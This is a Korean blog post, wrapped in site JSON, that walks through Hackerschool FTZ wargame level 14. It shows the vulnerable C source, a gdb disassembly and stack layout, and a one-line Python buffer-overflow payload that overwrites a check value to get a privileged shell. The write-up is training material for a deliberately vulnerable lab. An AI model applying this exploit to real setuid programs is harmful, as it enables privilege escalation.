{"componentChunkName":"component---src-templates-post-template-tsx","path":"/221004/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h3>0. 들어가기 전에</h3>\n<p>또다시 BOF 문제이다. 이번에는 입력 크기에 제한을 받았지만, 배열의 길이가 20인것에 반해 입력은 45까지(…) 받는다.</p>\n<p>그리고 저번 문제와 다르게, check값만 일치한다면 shell을 실행해준다.</p>\n<h3>1. Level 14</h3>\n<p>바로 cat hint로 소스코드를 확인해보자.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">#include &lt;stdio.h>\r\n#include &lt;unistd.h>\r\n\r\nmain()\r\n{ int crap;\r\n  int check;\r\n  char buf[20];\r\n  fgets(buf,45,stdin);\r\n  if (check==0xdeadbeef)\r\n   {\r\n     setreuid(3095,3095);\r\n     system(\"/bin/sh\");\r\n   }\r\n}</code></pre></div>\n<p>말했던 것처럼, 오버플로우가 충분히 일어날 수 있는 구조이다. 한 번 코드를 복사/컴파일 해서 gdb로 disassemble 해보자.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">0x080483b8 &lt;main+0>:    push   ebp\r\n0x080483b9 &lt;main+1>:    mov    ebp,esp\r\n0x080483bb &lt;main+3>:    sub    esp,0x38\r\n0x080483be &lt;main+6>:    and    esp,0xfffffff0\r\n0x080483c1 &lt;main+9>:    mov    eax,0x0\r\n0x080483c6 &lt;main+14>:   sub    esp,eax\r\n0x080483c8 &lt;main+16>:   sub    esp,0x4\r\n0x080483cb &lt;main+19>:   push   ds:0x80495d0\r\n0x080483d1 &lt;main+25>:   push   0x2d\r\n0x080483d3 &lt;main+27>:   lea    eax,[ebp-56] // char buf[20]\r\n0x080483d6 &lt;main+30>:   push   eax\r\n0x080483d7 &lt;main+31>:   call   0x80482d8 &lt;fgets>\r\n0x080483dc &lt;main+36>:   add    esp,0x10\r\n0x080483df &lt;main+39>:   cmp    DWORD PTR [ebp-16] // if, 12-16 = int check\r\n0x080483e6 &lt;main+46>:   jne    0x804840d &lt;main+85>\r\n0x080483e8 &lt;main+48>:   sub    esp,0x8\r\n0x080483eb &lt;main+51>:   push   0xc17\r\n0x080483f0 &lt;main+56>:   push   0xc17\r\n0x080483f5 &lt;main+61>:   call   0x80482f8 &lt;setreuid>\r\n0x080483fa &lt;main+66>:   add    esp,0x10\r\n0x080483fd &lt;main+69>:   sub    esp,0xc\r\n0x08048400 &lt;main+72>:   push   0x80484bc</code></pre></div>\n<p>생각보다 어렵지 않은 구조다. 재구성해보면 :</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">char[20] // 56-36\r\ndummy[20] // 36-16\r\nint check // 16-12</code></pre></div>\n<p>따라서 40바이트의 \\x90과 4바이트의 int의 값을 맞춰주면 된다. 1 바이트나 여유가 남는다(!)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">@BufferOverflow :\r\n(python -c 'print \"A\"*40+\"\\xef\\xbe\\xad\\xde\"'; cat) | ./attackme</code></pre></div>\n<p>비밀번호 : guess what</p>\n<p>문제가 조금씩 어려워지고 있다. 얼른 Level20까지 끝냈으면…</p>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>해커스쿨 FTZ</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"해커스쿨 FTZ 레벨 14","summary":"","date":"2022.10.04.","before":"2022.10.03.","after":"2022.10.05.","categories":["KOR","pwn"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAANABQDASIAAhEBAxEB/8QAGQAAAgMBAAAAAAAAAAAAAAAAAAYBBAcJ/8QAFQEBAQAAAAAAAAAAAAAAAAAABQT/2gAMAwEAAhADEAAAAecqxk1Wh+RFETf/xAAbEAACAwEBAQAAAAAAAAAAAAAEBQECAwYAB//aAAgBAQABBQLk/ozxAp6+x250njzKluVVkeVbX188ot//xAAfEQACAgIBBQAAAAAAAAAAAAACAwERBBMSACExkdL/2gAIAQMBAT8B2ilGRqfkmnJaO5BG2Fm7EEBS+Rl5DcJ1Lio5UF8u9RLSvwPufnr/xAAeEQACAgICAwAAAAAAAAAAAAACAwEEEiEAEyIx0f/aAAgBAgEBPwGsMuOvJoqKdUSa02ASruFNphvYnsFMEQTYJzZgvHNpzjM7LvZGsla16P5z/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIDBBIABRETISIxQRQVIzKSoeH/2gAIAQEABj8Cr8omzfNjSx0cVDkTQ1ctNLk8805aGopgwe2jCPUeqprZBLtoiABi49xzLNBmMiyVFOlaqho6iOCd13t5eH3VtdLF05PQCcctz56Tx+sEaq61NHJQkSC/bjHzI8Wv1lR06X72ySL2Y42nGqqblFzWp5NijQKWJBJHkdscKfy/mP/EAB0QAQADAAIDAQAAAAAAAAAAAAEAESFBUTFhcYH/2gAIAQEAAT8hzE24tLQPVhJNJSUr0wCVxU0kcX1weVyNLTnpyNwLOBO6TwpZRaBNbsWfuEhKrYwKf3z+J//aAAwDAQACAAMAAAAQkN//xAAaEQEAAgMBAAAAAAAAAAAAAAABETEAIaFh/9oACAEDAQE/EEyD5/zMnaTFJWUhNy32jxPPc//EABoRAQACAwEAAAAAAAAAAAAAAAERMQAhQZH/2gAIAQIBAT8QEX6POL11GhsyL86M8GpYB4FVWf/EABgQAQEBAQEAAAAAAAAAAAAAAAERIQAx/9oACAEBAAE/EJoUOgd33xFiGjvwLQjW8KY0zoweyIVAKQD6LTn7qVBNlE8EIiuUSHK55IjERS7B4w67dNSnsqKzV7//2Q=="},"images":{"fallback":{"src":"/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg","srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e6e0/C_Sec.jpg 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/edde1/C_Sec.jpg 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg 1080w","sizes":"(min-width: 1080px) 1080px, 100vw"},"sources":[{"srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e1cd/C_Sec.webp 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/08f1e/C_Sec.webp 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/c34ed/C_Sec.webp 1080w","type":"image/webp","sizes":"(min-width: 1080px) 1080px, 100vw"}]},"width":1080,"height":720}},"publicURL":"/static/19e515bba8750881aa8c0a71dc14e660/C_Sec.jpg"}}}}]}},"pageContext":{"slug":"/221004/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}